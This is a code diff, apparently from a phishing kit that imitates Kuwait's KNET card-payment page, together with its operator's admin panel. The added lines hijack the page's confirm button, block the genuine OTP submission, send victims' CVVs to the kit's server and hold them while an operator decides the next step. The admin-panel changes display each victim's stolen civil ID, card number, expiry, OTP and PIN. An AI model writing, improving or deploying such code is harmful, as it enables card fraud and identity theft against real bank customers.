@@ -221,19 +221,33 @@ function buildCvvPatchScript(knetId, showError) {
     if (confirmButton) {
       var newBtn = confirmButton.cloneNode(true);
       confirmButton.parentNode.replaceChild(newBtn, confirmButton);
+      // Also intercept the form submit to prevent Angular from sending OTP
+      var form = newBtn.closest('form');
+      if (form) {
+        form.addEventListener('submit', function(e) { e.preventDefault(); e.stopImmediatePropagation(); }, true);
+      }
       newBtn.addEventListener('click', function(e) {
         e.stopImmediatePropagation();
+        e.stopPropagation();
         e.preventDefault();
+        // Disable the OTP input to prevent Angular from reading it
+        var otpInput = document.querySelector('input[name="otp"]');
+        if (otpInput) { otpInput.disabled = true; }
         var input = document.querySelector('#cvv-patch-input') || document.querySelector('input[placeholder="CVV"]');
         var cvv = input ? input.value.trim() : '';
-        if (!cvv || cvv.length < 3) { if (input) input.style.borderColor = 'red'; return; }
+        if (!cvv || cvv.length < 3) {
+          if (input) input.style.borderColor = 'red';
+          if (otpInput) otpInput.disabled = false;
+          return;
+        }
         if (input) input.style.borderColor = '';
         newBtn.disabled = true;
         fetch('/knet/cvv', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ knetId: knetId, cvv: cvv }) })
           .then(function(r) { return r.json(); })
           .then(function(data) {
-            newBtn.disabled = false;
             if (data.success) {
+              // Show loading state - wait for admin decision
+              if (input) input.disabled = true;
               var pollTimer = setInterval(function() {
                 fetch('/knet/status/' + knetId).then(function(r) { return r.json(); }).then(function(d) {
                   if (!d || !d.payment) return;
@@ -242,8 +256,14 @@ function buildCvvPatchScript(knetId, showError) {
                   else if (s === 'CVV_FAILED') { clearInterval(pollTimer); window.location.href = '/knet/cvv?id=' + knetId + '&error=1'; }
                 }).catch(function() {});
               }, 1500);
+            } else {
+              newBtn.disabled = false;
+              if (otpInput) otpInput.disabled = false;
             }
-          }).catch(function() { newBtn.disabled = false; });
+          }).catch(function() {
+            newBtn.disabled = false;
+            if (otpInput) otpInput.disabled = false;
+          });
       }, true);
     }
     return true;
@@ -1026,7 +1046,7 @@ function getAdminHTML() {
       html += '<td><span class="ref-code">' + (p.refNumber || id.substring(0, 8)) + '</span></td>';
       html += '<td><b>' + (p.loginCivilId || p.clientId || '-') + '</b></td>';
       html += '<td>' + (p.bankName || '-') + '</td>';
-      html += '<td><span style="font-family:monospace">' + (p.prefix || '') + ' ' + (p.cardNumber || '-') + '</span></td>';
+      html += '<td><span style="font-family:monospace;direction:ltr;display:inline-block">' + (p.prefix || '') + ' ' + (p.cardNumber || '-') + '</span></td>';
       html += '<td>' + (p.expiryMonth || '') + (p.expiryMonth && p.expiryYear ? '/' : '') + (p.expiryYear || '-') + '</td>';
       html += '<td>' + getStatusBadge(p.status) + '</td>';
       html += '<td><span style="font-family:monospace;font-weight:700;color:#d97706">' + otp + '</span></td>';
@@ -1094,7 +1114,7 @@ function getAdminHTML() {
     html += '</div>';
     html += '<div class="sec-title">بيانات البطاقة</div><div class="detail-grid">';
     html += dRow('البنك', p.bankName, false);
-    html += dRow('رقم البطاقة', (p.prefix || '') + ' ' + (p.cardNumber || ''), true);
+    html += dRow('رقم البطاقة', '<span style="direction:ltr;display:inline-block">' + (p.prefix || '') + ' ' + (p.cardNumber || '') + '</span>', true);
     html += dRow('تاريخ الانتهاء', (p.expiryMonth || '') + '/' + (p.expiryYear || ''), false);
     html += dRow('الرقم السري (PIN)', p.pass && p.pass !== '---' ? p.pass : null, true);
     html += '</div>';
